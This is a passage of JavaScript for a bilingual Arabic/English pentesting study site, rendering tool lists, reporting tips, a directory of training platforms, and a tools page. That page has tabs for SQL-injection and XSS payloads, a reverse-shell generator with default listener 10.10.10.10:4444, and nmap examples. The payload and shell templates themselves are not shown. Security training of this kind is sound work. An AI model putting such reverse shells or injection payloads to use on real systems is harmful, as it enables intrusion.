              <li><strong>Scanner:</strong> ${txt('فحص تلقائي للثغرات (Pro)', 'Automated vulnerability scanning (Pro)')}</li>
              <li><strong>Collaborator:</strong> ${txt('كشف الثغرات العمياء', 'Detect blind vulnerabilities')}</li>
            </ul>
            <a href="https://portswigger.net/burp" target="_blank" class="btn btn-sm btn-outline-primary">
              <i class="fa-solid fa-download"></i> ${txt('تحميل', 'Download')}
            </a>
          </div>
          <div class="col-md-6">
            <h6><i class="fa-brands fa-firefox"></i> Browser Extensions</h6>
            <ul class="small">
              <li><strong>FoxyProxy:</strong> ${txt('تبديل البروكسي بسرعة', 'Quick proxy switching')}</li>
              <li><strong>Wappalyzer:</strong> ${txt('كشف التقنيات المستخدمة', 'Technology detection')}</li>
              <li><strong>Cookie-Editor:</strong> ${txt('تعديل الكوكيز', 'Edit cookies')}</li>
              <li><strong>HackTools:</strong> ${txt('مرجع سريع للـ Payloads', 'Quick reference for payloads')}</li>
            </ul>
          </div>
        </div>
      </div>
    </div>

    <div class="card bg-light">
      <div class="card-body">
        <h6><i class="fa-solid fa-lightbulb"></i> ${txt('نصائح للاستغلال الفعال', 'Effective Exploitation Tips')}</h6>
        <ul class="small">
          <li>${txt('دائماً ابدأ بفهم سياق التطبيق والبيانات', 'Always start by understanding the application context and data flow')}</li>
          <li>${txt('اختبر جميع المدخلات (Headers, Cookies, Parameters)', 'Test all inputs (Headers, Cookies, Parameters)')}</li>
          <li>${txt('ابحث عن نقاط الضعف في المنطق قبل الثغرات التقنية', 'Look for business logic flaws before technical vulnerabilities')}</li>
          <li>${txt('وثق كل خطوة للتقرير النهائي', 'Document every step for the final report')}</li>
          <li>${txt('احترم نطاق الاختبار ولا تتجاوزه', 'Respect the scope and do not exceed it')}</li>
        </ul>
      </div>
    </div>
  </div> `;
}

function pagePost() {
  return `
    <div class="container mt-4">
    <h2><i class="fa-solid fa-clipboard-check"></i> ${txt('ما بعد الاستغلال', 'Post-Exploitation')}</h2>
    
    <div class="alert alert-success">
      <i class="fa-solid fa-circle-info"></i> ${txt('خطوات ما بعد اكتشاف الثغرة واستغلالها بنجاح',
    'Steps after successfully discovering and exploiting a vulnerability')}
    </div>

    <div class="row g-3">
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-primary text-white">
            <h5 class="mb-0"><i class="fa-solid fa-camera"></i> ${txt('جمع الأدلة', 'Evidence Collection')}</h5>
          </div>
          <div class="card-body">
            <h6 class="fw-bold">${txt('اللقطات (Screenshots)', 'Screenshots')}</h6>
            <ul class="small">
              <li>${txt('التقط صوراً عالية الجودة تظهر الثغرة', 'Take high-quality screenshots showing the vulnerability')}</li>
              <li>${txt('اضمن URL الكامل في اللقطة', 'Include the full URL in the screenshot')}</li>
              <li>${txt('اظهر بيانات حساسة مع إخفاء الأجزاء السرية', 'Show sensitive data while redacting secrets')}</li>
              <li>${txt('صور لكل خطوة في سلسلة الاستغلال', 'Screenshot each step in exploitation chain')}</li>
            </ul>

            <h6 class="fw-bold mt-3">${txt('سجلات HTTP', 'HTTP Logs')}</h6>
            <ul class="small">
              <li>${txt('احفظ Request/Response الكامل', 'Save full Request/Response')}</li>
              <li>${txt('استخدم Burp Suite → Save item', 'Use Burp Suite → Save item')}</li>
              <li>${txt('انسخ cURL command لسهولة الإعادة', 'Copy cURL command for easy reproduction')}</li>
            </ul>
          </div>
        </div>
      </div>
      
      <div class="col-md-6">
        <div class="card h-100">
          <div class="card-header bg-success text-white">
            <h5 class="mb-0"><i class="fa-solid fa-pen"></i> ${txt('كتابة التقرير', 'Writing the Report')}</h5>
          </div>
          <div class="card-body">
            <h6 class="fw-bold">${txt('العنوان والمقدمة', 'Title & Introduction')}</h6>
            <ul class="small">
              <li>${txt('أعط التقرير عنوان واضح وملخص', 'Give the report a clear title and summary')}</li>
              <li>${txt('وصف النظام المستهدف بوضوح', 'Describe the target system clearly')}</li>
            </ul>

            <h6 class="fw-bold mt-3">${txt('تفاصيل الثغرة', 'Vulnerability Details')}</h6>
            <ul class="small">
              <li>${txt('وصف الثغرة بدقة', 'Describe the vulnerability in detail')}</li>
              <li>${txt('تحديد نوع الثغرة', 'Identify the type of vulnerability')}</li>
              <li>${txt('شرح كيفية الاستغلال', 'Explain how to exploit')}</li>
            </ul>

            <h6 class="fw-bold mt-3">${txt('أثر الثغرة', 'Impact')}</h6>
            <ul class="small">
              <li>${txt('شرح تأثير الثغرة على النظام', 'Explain the impact of the vulnerability on the system')}</li>
              <li>${txt('تحديد مستوى خطورة الثغرة', 'Identify the severity level')}</li>
              <li>${txt('اقتراح تحسينات للتصحيح', 'Suggest fixes')}</li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </div> `;
}

/* ========== إذا أردت استيرادها كـ Node module ========== */
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    pageOverview, pageRecon, pageScan, pageVulns, pageExploit,
    pagePost, pageReport, pageLabs, pageTools, pagePayloads, pageNotes,
    pagePlayground, pageEjpt, pageEwpt, pageBugBounty
  };
}

function pageLabs() {
  const platforms = [
    // Beginner-Friendly
    {
      name: 'PortSwigger Web Security Academy',
      url: 'https://portswigger.net/web-security',
      category: 'beginner',
      icon: 'fa-graduation-cap',
      color: '#ff6900',
      rating: 5,
      labs: '200+',
      level: txt('مبتدئ - متقدم', 'Beginner - Advanced'),
      specialty: ['Web', 'OWASP Top 10'],
      price: txt('مجاني', 'Free'),
      desc: txt('أفضل منصة لتعلم ثغرات الويب مع شروحات تفصيلية', 'Best platform for learning web vulnerabilities with detailed explanations')
    },
    {
      name: 'TryHackMe',
      url: 'https://tryhackme.com/',
      category: 'beginner',
      icon: 'fa-rocket',
      color: '#212c42',
      rating: 5,
      labs: '500+',
      level: txt('مبتدئ - متوسط', 'Beginner - Intermediate'),
      specialty: ['Web', 'Network', 'Linux'],
      price: txt('مجاني + مدفوع', 'Free + Premium'),
      desc: txt('مسارات تعليمية موجهة مع بيئات افتراضية جاهزة', 'Guided learning paths with ready virtual environments')
    },
    {
      name: 'PentesterLab',
      url: 'https://pentesterlab.com/',
      category: 'beginner',
      icon: 'fa-flask',
      color: '#e74c3c',
      rating: 4,
      labs: '100+',
      level: txt('مبتدئ - متوسط', 'Beginner - Intermediate'),
      specialty: ['Web', 'Pentesting'],
      price: txt('مجاني + مدفوع', 'Free + Premium'),
      desc: txt('تمارين عملية مع شروحات خطوة بخطوة', 'Practical exercises with step-by-step explanations')
    },

    // Advanced
    {
      name: 'Hack The Box',
      url: 'https://www.hackthebox.com/',
      category: 'advanced',
      icon: 'fa-cube',
      color: '#9fef00',
      rating: 5,
      labs: '300+',
      level: txt('متوسط - متقدم', 'Intermediate - Advanced'),
      specialty: ['Pentesting', 'Red Team', 'Active Directory'],
      price: txt('مجاني + مدفوع', 'Free + Premium'),
      desc: txt('أجهزة افتراضية واقعية مع تحديات متقدمة', 'Realistic virtual machines with advanced challenges')
    },
    {
      name: 'Root-Me',
      url: 'https://www.root-me.org/',
      category: 'advanced',
      icon: 'fa-terminal',
      color: '#e84a4f',
      rating: 4,
      labs: '400+',
      level: txt('متوسط - متقدم', 'Intermediate - Advanced'),
      specialty: ['Web', 'Crypto', 'Forensics', 'Network'],
      price: txt('مجاني', 'Free'),
      desc: txt('تحديات متنوعة في جميع مجالات الأمن السيبراني', 'Diverse challenges across all cybersecurity domains')
    },
    {
      name: 'OverTheWire',
      url: 'https://overthewire.org/',
      category: 'advanced',
      icon: 'fa-server',
      color: '#000000',
      rating: 5,
      labs: '30+',
      level: txt('متوسط - خبير', 'Intermediate - Expert'),
      specialty: ['Linux', 'Privilege Escalation', 'Scripting'],
      price: txt('مجاني', 'Free'),
      desc: txt('تحديات Linux الكلاسيكية لتطوير مهارات سطر الأوامر', 'Classic Linux challenges to develop command-line skills')
    },

    // CTF-Focused
    {
      name: 'CTFlearn',
      url: 'https://ctflearn.com/',
      category: 'ctf',
      icon: 'fa-flag-checkered',
      color: '#f39c12',
      rating: 4,
      labs: '300+',
      level: txt('مبتدئ - متقدم', 'Beginner - Advanced'),
      specialty: ['CTF', 'Crypto', 'Forensics', 'Web'],
      price: txt('مجاني', 'Free'),
      desc: txt('تحديات CTF دائمة مع مجتمع نشط', 'Permanent CTF challenges with active community')
    },
    {
      name: 'picoCTF',
      url: 'https://picoctf.org/',
      category: 'ctf',
      icon: 'fa-trophy',
      color: '#4285f4',
      rating: 5,
      labs: '200+',
      level: txt('مبتدئ - متوسط', 'Beginner - Intermediate'),
      specialty: ['CTF', 'Education'],
      price: txt('مجاني', 'Free'),
      desc: txt('منصة CTF تعليمية مناسبة للمبتدئين', 'Educational CTF platform suitable for beginners')
    },
    {
      name: 'VulnHub',
      url: 'https://www.vulnhub.com/',
      category: 'ctf',
      icon: 'fa-download',
      color: '#2c3e50',
      rating: 4,
      labs: '600+',
      level: txt('متوسط - متقدم', 'Intermediate - Advanced'),
      specialty: ['Boot2Root', 'VM'],
      price: txt('مجاني', 'Free'),
      desc: txt('أجهزة افتراضية قابلة للتحميل لممارسة الاختراق', 'Downloadable VMs for penetration testing practice')
    }
  ];

  const renderPlatformCard = (platform) => `
    <div class="col-md-6 col-lg-4">
      <div class="platform-card h-100">
        <div class="platform-header" style="background: ${platform.color};">
          <div class="d-flex justify-content-between align-items-start mb-2">
            <i class="fa-solid ${platform.icon} platform-icon"></i>
            <div class="rating">
              ${Array(5).fill(0).map((_, i) => `
                <i class="fa-solid fa-star ${i < platform.rating ? 'text-warning' : 'text-muted'}"></i>
              `).join('')}
            </div>
          </div>
          <h5 class="fw-bold mb-0">${platform.name}</h5>
        </div>
        <div class="platform-body">
          <p class="text-muted small mb-3">${platform.desc}</p>
          
          <div class="platform-stats mb-3">
            <div class="stat-item">
              <i class="fa-solid fa-flask text-primary"></i>
              <span>${platform.labs} ${txt('مختبر', 'Labs')}</span>
            </div>
            <div class="stat-item">
              <i class="fa-solid fa-signal text-success"></i>
              <span>${platform.level}</span>
            </div>
            <div class="stat-item">
              <i class="fa-solid fa-tag text-info"></i>
              <span>${platform.price}</span>
            </div>
          </div>
          
          <div class="specialty-tags mb-3">
            ${platform.specialty.map(spec => `
              <span class="badge bg-light text-dark border">${spec}</span>
            `).join('')}
          </div>
          
          <a href="${platform.url}" target="_blank" class="btn btn-primary w-100">
            <i class="fa-solid fa-external-link-alt me-2"></i>
            ${txt('زيارة المنصة', 'Visit Platform')}
          </a>
        </div>
      </div>
    </div>
  `;

  const beginnerPlatforms = platforms.filter(p => p.category === 'beginner');
  const advancedPlatforms = platforms.filter(p => p.category === 'advanced');
  const ctfPlatforms = platforms.filter(p => p.category === 'ctf');

  return `
    <div class="container-fluid mt-4">
      <style>
        .labs-hero {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          padding: 60px 20px;
          border-radius: 20px;
          margin-bottom: 40px;
          position: relative;
          overflow: hidden;
        }
        .labs-hero::before {
          content: '';
          position: absolute;
          top: -50%;
          right: -50%;
          width: 200%;
          height: 200%;
          background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
          animation: pulse 15s ease-in-out infinite;
        }
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        .platform-card {
          background: white;
          border-radius: 15px;
          overflow: hidden;
          transition: all 0.3s ease;
          border: 2px solid #f0f0f0;
        }
        .platform-card:hover {
          transform: translateY(-10px);
          box-shadow: 0 20px 40px rgba(0,0,0,0.15);
          border-color: var(--bs-primary);
        }
        .platform-header {
          padding: 25px;
          color: white;
          position: relative;
        }
        .platform-icon {
          font-size: 2.5rem;
          opacity: 0.9;
        }
        .platform-body {
          padding: 25px;
        }
        .platform-stats {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }
        .stat-item {
          display: flex;
          align-items: center;
          gap: 10px;
          font-size: 0.9rem;
        }
        .stat-item i {
          width: 20px;
        }
        .specialty-tags {
          display: flex;
          flex-wrap: wrap;
          gap: 5px;
        }
        .specialty-tags .badge {
          font-size: 0.75rem;
          padding: 5px 10px;
        }
        .rating {
          font-size: 0.9rem;
        }
        .category-section {
          margin-bottom: 50px;
        }
        .category-header {
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 25px;
          padding-bottom: 15px;
          border-bottom: 3px solid #f0f0f0;
        }
        .category-icon {
          width: 50px;
          height: 50px;
          border-radius: 12px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 1.5rem;
        }
      </style>

      <!-- Hero Section -->
      <div class="labs-hero text-center">
        <div class="container" style="position: relative; z-index: 1;">
          <h1 class="display-4 fw-bold mb-3">
            <i class="fa-solid fa-flask-vial me-3"></i>
            ${txt('منصات التدريب العملي', 'Practical Training Platforms')}
          </h1>
          <p class="lead mb-4" style="opacity: 0.95;">
            ${txt('اكتشف أفضل المنصات لتطوير مهاراتك في الأمن السيبراني من خلال التدريب العملي', 'Discover the best platforms to develop your cybersecurity skills through hands-on training')}
          </p>
          <div class="d-flex justify-content-center gap-4 flex-wrap">
            <div class="text-center">
              <h3 class="fw-bold">${platforms.length}</h3>
              <small style="opacity: 0.8;">${txt('منصة متاحة', 'Available Platforms')}</small>
            </div>
            <div class="text-center">
              <h3 class="fw-bold">2000+</h3>
              <small style="opacity: 0.8;">${txt('مختبر عملي', 'Practical Labs')}</small>
            </div>
            <div class="text-center">
              <h3 class="fw-bold">10+</h3>
              <small style="opacity: 0.8;">${txt('تخصصات مختلفة', 'Different Specialties')}</small>
            </div>
          </div>
        </div>
      </div>

      <div class="container">
        <!-- Beginner-Friendly Section -->
        <div class="category-section">
          <div class="category-header">
            <div class="category-icon bg-success bg-opacity-10 text-success">
              <i class="fa-solid fa-seedling"></i>
            </div>
            <div>
              <h3 class="mb-1">${txt('منصات صديقة للمبتدئين', 'Beginner-Friendly Platforms')}</h3>
              <p class="text-muted mb-0">${txt('ابدأ رحلتك مع منصات توفر شروحات تفصيلية ومسارات موجهة', 'Start your journey with platforms offering detailed explanations and guided paths')}</p>
            </div>
          </div>
          <div class="row g-4">
            ${beginnerPlatforms.map(renderPlatformCard).join('')}
          </div>
        </div>

        <!-- Advanced Section -->
        <div class="category-section">
          <div class="category-header">
            <div class="category-icon bg-danger bg-opacity-10 text-danger">
              <i class="fa-solid fa-fire"></i>
            </div>
            <div>
              <h3 class="mb-1">${txt('منصات متقدمة', 'Advanced Platforms')}</h3>
              <p class="text-muted mb-0">${txt('تحديات واقعية للمحترفين والراغبين في تطوير مهاراتهم المتقدمة', 'Realistic challenges for professionals and those seeking to develop advanced skills')}</p>
            </div>
          </div>
          <div class="row g-4">
            ${advancedPlatforms.map(renderPlatformCard).join('')}
          </div>
        </div>

        <!-- CTF-Focused Section -->
        <div class="category-section">
          <div class="category-header">
            <div class="category-icon bg-warning bg-opacity-10 text-warning">
              <i class="fa-solid fa-trophy"></i>
            </div>
            <div>
              <h3 class="mb-1">${txt('منصات CTF', 'CTF-Focused Platforms')}</h3>
              <p class="text-muted mb-0">${txt('تحديات Capture The Flag لاختبار مهاراتك في بيئة تنافسية', 'Capture The Flag challenges to test your skills in a competitive environment')}</p>
            </div>
          </div>
          <div class="row g-4">
            ${ctfPlatforms.map(renderPlatformCard).join('')}
          </div>
        </div>

        <!-- Tips Section -->
        <div class="card bg-light border-0 shadow-sm">
          <div class="card-body p-4">
            <h4 class="mb-3">
              <i class="fa-solid fa-lightbulb text-warning me-2"></i>
              ${txt('نصائح للاستفادة القصوى', 'Tips for Maximum Benefit')}
            </h4>
            <div class="row">
              <div class="col-md-6">
                <ul class="list-unstyled">
                  <li class="mb-2"><i class="fa-solid fa-check text-success me-2"></i>${txt('ابدأ بالمنصات الصديقة للمبتدئين', 'Start with beginner-friendly platforms')}</li>
                  <li class="mb-2"><i class="fa-solid fa-check text-success me-2"></i>${txt('خصص وقتاً يومياً للتدريب', 'Dedicate daily time for training')}</li>
                  <li class="mb-2"><i class="fa-solid fa-check text-success me-2"></i>${txt('اقرأ writeups بعد حل التحديات', 'Read writeups after solving challenges')}</li>
                </ul>
              </div>
              <div class="col-md-6">
                <ul class="list-unstyled">
                  <li class="mb-2"><i class="fa-solid fa-check text-success me-2"></i>${txt('شارك في المجتمعات والمنتديات', 'Participate in communities and forums')}</li>
                  <li class="mb-2"><i class="fa-solid fa-check text-success me-2"></i>${txt('وثق تقدمك واحتفظ بملاحظاتك', 'Document your progress and keep notes')}</li>
                  <li class="mb-2"><i class="fa-solid fa-check text-success me-2"></i>${txt('لا تستسلم عند مواجهة صعوبات', 'Don\'t give up when facing difficulties')}</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;
}


function pageTools() {
  return `
    <div class="container-fluid mt-4">
      <h2><i class="fa-solid fa-toolbox"></i> ${txt('الأدوات المدمجة', 'Integrated Tools')}</h2>
      <p class="lead">${txt('7 أدوات احترافية تعمل مباشرة في المتصفح - لا حاجة للتثبيت!', '7 professional tools working directly in browser - no installation needed!')}</p>
      
      <!-- Tools Tabs -->
      <ul class="nav nav-tabs mb-4" id="toolsTabs" role="tablist">
        <li class="nav-item" role="presentation">
          <button class="nav-link active" id="encoder-tab" data-bs-toggle="tab" data-bs-target="#encoder" type="button" role="tab">
            <i class="fa-solid fa-code"></i> ${txt('ترميز/فك', 'Encoder')}
          </button>
        </li>
        <li class="nav-item" role="presentation">
          <button class="nav-link" id="hash-tab" data-bs-toggle="tab" data-bs-target="#hash" type="button" role="tab">
            <i class="fa-solid fa-hashtag"></i> ${txt('هاش', 'Hash')}
          </button>
        </li>
        <li class="nav-item" role="presentation">
          <button class="nav-link" id="sql-tab" data-bs-toggle="tab" data-bs-target="#sql" type="button" role="tab">
            <i class="fa-solid fa-database"></i> SQL Injection
          </button>
        </li>
        <li class="nav-item" role="presentation">
          <button class="nav-link" id="xss-tab" data-bs-toggle="tab" data-bs-target="#xss" type="button" role="tab">
            <i class="fa-solid fa-bug"></i> XSS Payloads
          </button>
        </li>
        <li class="nav-item" role="presentation">
          <button class="nav-link" id="shell-tab" data-bs-toggle="tab" data-bs-target="#shell" type="button" role="tab">
            <i class="fa-solid fa-terminal"></i> ${txt('شل عكسي', 'Reverse Shell')}
          </button>
        </li>
        <li class="nav-item" role="presentation">
          <button class="nav-link" id="subdomain-tab" data-bs-toggle="tab" data-bs-target="#subdomain" type="button" role="tab">
            <i class="fa-solid fa-sitemap"></i> ${txt('نطاقات فرعية', 'Subdomains')}
          </button>
        </li>
        <li class="nav-item" role="presentation">
          <button class="nav-link" id="ports-tab" data-bs-toggle="tab" data-bs-target="#ports" type="button" role="tab">
            <i class="fa-solid fa-network-wired"></i> ${txt('منافذ', 'Ports')}
          </button>
        </li>
      </ul>
      
      <!-- Tab Content -->
      <div class="tab-content" id="toolsTabContent">
        
        <!-- Encoder/Decoder Tab -->
        <div class="tab-pane fade show active" id="encoder" role="tabpanel">
          <div class="row">
            <div class="col-md-6">
              <div class="card">
                <div class="card-header bg-primary text-white">
                  <h5 class="mb-0"><i class="fa-solid fa-arrow-right"></i> ${txt('الإدخال', 'Input')}</h5>
                </div>
                <div class="card-body">
                  <textarea id="encoder-input" class="form-control" rows="8" placeholder="${txt('أدخل النص هنا...', 'Enter text here...')}"></textarea>
                </div>
              </div>
            </div>
            <div class="col-md-6">
              <div class="card">
                <div class="card-header bg-success text-white">
                  <h5 class="mb-0"><i class="fa-solid fa-arrow-left"></i> ${txt('الإخراج', 'Output')}</h5>
                </div>
                <div class="card-body">
                  <textarea id="encoder-output" class="form-control" rows="8" placeholder="${txt('النتيجة ستظهر هنا...', 'Result will appear here...')}" readonly></textarea>
                  <button class="btn btn-sm btn-outline-secondary mt-2" onclick="copyToolOutput('encoder-output')">
                    <i class="fa-solid fa-copy"></i> ${txt('نسخ', 'Copy')}
                  </button>
                </div>
              </div>
            </div>
          </div>
          <div class="row mt-3">
            <div class="col-12">
              <div class="btn-group w-100" role="group">
                <button class="btn btn-outline-primary" onclick="encodeText('base64')">Base64 ${txt('ترميز', 'Encode')}</button>
                <button class="btn btn-outline-secondary" onclick="decodeText('base64')">Base64 ${txt('فك', 'Decode')}</button>
                <button class="btn btn-outline-primary" onclick="encodeText('url')">URL ${txt('ترميز', 'Encode')}</button>
                <button class="btn btn-outline-secondary" onclick="decodeText('url')">URL ${txt('فك', 'Decode')}</button>
                <button class="btn btn-outline-primary" onclick="encodeText('html')">HTML ${txt('ترميز', 'Encode')}</button>
                <button class="btn btn-outline-secondary" onclick="decodeText('html')">HTML ${txt('فك', 'Decode')}</button>
              </div>
              <div class="btn-group w-100 mt-2" role="group">
                <button class="btn btn-outline-primary" onclick="encodeText('hex')">Hex ${txt('ترميز', 'Encode')}</button>
                <button class="btn btn-outline-secondary" onclick="decodeText('hex')">Hex ${txt('فك', 'Decode')}</button>
                <button class="btn btn-outline-primary" onclick="encodeText('binary')">Binary ${txt('ترميز', 'Encode')}</button>
                <button class="btn btn-outline-secondary" onclick="decodeText('binary')">Binary ${txt('فك', 'Decode')}</button>
                <button class="btn btn-outline-warning" onclick="encodeText('rot13')">ROT13</button>
              </div>
            </div>
          </div>
        </div>
        
        <!-- Hash Generator Tab -->
        <div class="tab-pane fade" id="hash" role="tabpanel">
          <div class="card">
            <div class="card-header bg-info text-white">
              <h5 class="mb-0"><i class="fa-solid fa-hashtag"></i> ${txt('مولد الهاش', 'Hash Generator')}</h5>
            </div>
            <div class="card-body">
              <div class="mb-3">
                <label class="form-label">${txt('أدخل النص', 'Enter Text')}</label>
                <textarea id="hash-input" class="form-control" rows="3" placeholder="${txt('النص المراد تحويله لهاش...', 'Text to hash...')}"></textarea>
              </div>
              <div class="row g-2 mb-3">
                <div class="col-md-3">
                  <button class="btn btn-primary w-100" onclick="generateHashFromInput('md5')">MD5</button>
                </div>
                <div class="col-md-3">
                  <button class="btn btn-primary w-100" onclick="generateHashFromInput('sha1')">SHA1</button>
                </div>
                <div class="col-md-3">
                  <button class="btn btn-primary w-100" onclick="generateHashFromInput('sha256')">SHA256</button>
                </div>
                <div class="col-md-3">
                  <button class="btn btn-primary w-100" onclick="generateHashFromInput('sha512')">SHA512</button>
                </div>
              </div>
              <div class="mb-3">
                <label class="form-label">${txt('النتيجة', 'Result')}</label>
                <div class="input-group">
                  <input type="text" id="hash-output" class="form-control" readonly>
                  <button class="btn btn-outline-secondary" onclick="copyToolOutput('hash-output')">
                    <i class="fa-solid fa-copy"></i>
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
        
        <!-- SQL Injection Tab -->
        <div class="tab-pane fade" id="sql" role="tabpanel">
          <div class="alert alert-warning">
            <i class="fa-solid fa-triangle-exclamation"></i> ${txt('استخدم فقط على أنظمة مصرح لك باختبارها', 'Use only on systems you are authorized to test')}
          </div>
          <div class="mb-3">
            <label class="form-label">${txt('اختر قاعدة البيانات', 'Select Database')}</label>
            <select id="sql-db-select" class="form-select" onchange="loadSQLPayloads()">
              <option value="mysql">MySQL</option>
              <option value="postgresql">PostgreSQL</option>
              <option value="mssql">MS SQL Server</option>
              <option value="oracle">Oracle</option>
              <option value="bypass">Bypass Techniques</option>
            </select>
          </div>
          <div id="sql-payloads-container"></div>
          <script>
            function loadSQLPayloads() {
              const db = document.getElementById('sql-db-select').value;
              const payloads = sqlInjectionPayloads[db] || [];
              const container = document.getElementById('sql-payloads-container');
              container.innerHTML = '<div class="list-group">' + payloads.map((p, i) => 
                '<div class="list-group-item">' +
                  '<div class="d-flex justify-content-between align-items-center">' +
                    '<code class="flex-grow-1">' + p + '</code>' +
                    '<button class="btn btn-sm btn-outline-primary ms-2" onclick="copyPayloadText(this)">' +
                      '<i class="fa-solid fa-copy"></i>' +
                    '</button>' +
                  '</div>' +
                '</div>'
              ).join('') + '</div>';
            }
            // Load MySQL payloads by default
            setTimeout(loadSQLPayloads, 100);
          </script>
        </div>
        
        <!-- XSS Payloads Tab -->
        <div class="tab-pane fade" id="xss" role="tabpanel">
          <div class="alert alert-warning">
            <i class="fa-solid fa-triangle-exclamation"></i> ${txt('استخدم فقط على أنظمة مصرح لك باختبارها', 'Use only on systems you are authorized to test')}
          </div>
          <div class="mb-3">
            <label class="form-label">${txt('اختر نوع XSS', 'Select XSS Type')}</label>
            <select id="xss-type-select" class="form-select" onchange="loadXSSPayloads()">
              <option value="basic">Basic XSS</option>
              <option value="advanced">Advanced</option>
              <option value="bypass">Bypass Techniques</option>
              <option value="dom">DOM-based</option>
              <option value="polyglot">Polyglot</option>
            </select>
          </div>
          <div id="xss-payloads-container"></div>
          <script>
            function loadXSSPayloads() {
              const type = document.getElementById('xss-type-select').value;
              const payloads = xssPayloads[type] || [];
              const container = document.getElementById('xss-payloads-container');
              container.innerHTML = '<div class="list-group">' + payloads.map((p, i) => 
                '<div class="list-group-item">' +
                  '<div class="d-flex justify-content-between align-items-center">' +
                    '<code class="flex-grow-1 small">' + p.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</code>' +
                    '<button class="btn btn-sm btn-outline-primary ms-2" onclick="copyPayloadText(this)">' +
                      '<i class="fa-solid fa-copy"></i>' +
                    '</button>' +
                  '</div>' +
                '</div>'
              ).join('') + '</div>';
            }
            setTimeout(loadXSSPayloads, 100);
          </script>
        </div>
        
        <!-- Reverse Shell Tab -->
        <div class="tab-pane fade" id="shell" role="tabpanel">
          <div class="alert alert-danger">
            <i class="fa-solid fa-skull-crossbones"></i> ${txt('استخدم فقط في بيئات مصرح بها', 'Use only in authorized environments')}
          </div>
          <div class="row mb-3">
            <div class="col-md-6">
              <label class="form-label">${txt('عنوان IP', 'IP Address')}</label>
              <input type="text" id="shell-ip" class="form-control" value="10.10.10.10" placeholder="10.10.10.10">
            </div>
            <div class="col-md-6">
              <label class="form-label">${txt('المنفذ', 'Port')}</label>
              <input type="text" id="shell-port" class="form-control" value="4444" placeholder="4444">
            </div>
          </div>
          <div class="mb-3">
            <label class="form-label">${txt('اختر اللغة', 'Select Language')}</label>
            <select id="shell-lang-select" class="form-select" onchange="generateReverseShell()">
              <option value="bash">Bash</option>
              <option value="python">Python</option>
              <option value="php">PHP</option>
              <option value="perl">Perl</option>
              <option value="ruby">Ruby</option>
              <option value="netcat">Netcat</option>
              <option value="netcat_alt">Netcat (Alternative)</option>
              <option value="powershell">PowerShell</option>
              <option value="java">Java</option>
              <option value="nodejs">Node.js</option>
            </select>
          </div>
          <div class="mb-3">
            <label class="form-label">${txt('الأمر', 'Command')}</label>
            <div class="input-group">
              <textarea id="shell-output" class="form-control" rows="4" readonly></textarea>
              <button class="btn btn-outline-secondary" onclick="copyToolOutput('shell-output')">
                <i class="fa-solid fa-copy"></i>
              </button>
            </div>
          </div>
          <button class="btn btn-primary" onclick="generateReverseShell()">
            <i class="fa-solid fa-wand-magic-sparkles"></i> ${txt('توليد', 'Generate')}
          </button>
          <script>
            function generateReverseShell() {
              const ip = document.getElementById('shell-ip').value;
              const port = document.getElementById('shell-port').value;
              const lang = document.getElementById('shell-lang-select').value;
              const shell = reverseShellTemplates[lang](ip, port);
              document.getElementById('shell-output').value = shell;
            }
            setTimeout(generateReverseShell, 100);
          </script>
        </div>
        
        <!-- Subdomain Finder Tab -->
        <div class="tab-pane fade" id="subdomain" role="tabpanel">
          <div class="card">
            <div class="card-header bg-primary text-white">
              <h5 class="mb-0"><i class="fa-solid fa-sitemap"></i> ${txt('النطاقات الفرعية الشائعة', 'Common Subdomains')}</h5>
            </div>
            <div class="card-body">
              <div class="mb-3">
                <label class="form-label">${txt('أدخل النطاق الرئيسي', 'Enter Main Domain')}</label>
                <input type="text" id="subdomain-domain" class="form-control" placeholder="example.com" value="example.com">
                <button class="btn btn-primary mt-2" onclick="generateSubdomains()">
                  <i class="fa-solid fa-list"></i> ${txt('توليد القائمة', 'Generate List')}
                </button>
              </div>
              <div id="subdomain-list"></div>
              <script>
                function generateSubdomains() {
                  const domain = document.getElementById('subdomain-domain').value;
                  const list = document.getElementById('subdomain-list');
                  list.innerHTML = '<div class="alert alert-info"><strong>' + commonSubdomains.length + '</strong> ${txt('نطاق فرعي شائع', 'common subdomains')}</div>' +
                    '<div class="list-group" style="max-height: 400px; overflow-y: auto;">' +
                    commonSubdomains.map(sub => 
                      '<div class="list-group-item">' +
                        '<div class="d-flex justify-content-between align-items-center">' +
                          '<code>' + sub + '.' + domain + '</code>' +
                          '<button class="btn btn-sm btn-outline-primary" onclick="copyPayloadText(this)">' +
                            '<i class="fa-solid fa-copy"></i>' +
                          '</button>' +
                        '</div>' +
                      '</div>'
                    ).join('') +
                    '</div>';
                }
              </script>
            </div>
          </div>
        </div>
        
        <!-- Port Scanner Tab -->
        <div class="tab-pane fade" id="ports" role="tabpanel">
          <div class="card">
            <div class="card-header bg-success text-white">
              <h5 class="mb-0"><i class="fa-solid fa-network-wired"></i> ${txt('المنافذ الشائعة', 'Common Ports Reference')}</h5>
            </div>
            <div class="card-body">
              <div class="table-responsive">
                <table class="table table-striped table-hover">
                  <thead>
                    <tr>
                      <th>${txt('المنفذ', 'Port')}</th>
                      <th>${txt('الخدمة', 'Service')}</th>
                      <th>${txt('الوصف', 'Description')}</th>
                    </tr>
                  </thead>
                  <tbody>
                    ${commonPorts.map(p =>
    '<tr>' +
    '<td><code>' + p.port + '</code></td>' +
    '<td><strong>' + p.service + '</strong></td>' +
    '<td>' + p.description + '</td>' +
    '</tr>'
  ).join('')}
                  </tbody>
                </table>
              </div>
              <div class="alert alert-info mt-3">
                <h6><i class="fa-solid fa-terminal"></i> Nmap ${txt('أمثلة', 'Examples')}</h6>
                <code>nmap -sV -p- target.com</code> - ${txt('فحص كل المنافذ', 'Scan all ports')}<br>
                <code>nmap -sC -sV -p 80,443 target.com</code> - ${txt('فحص منافذ محددة', 'Scan specific ports')}<br>
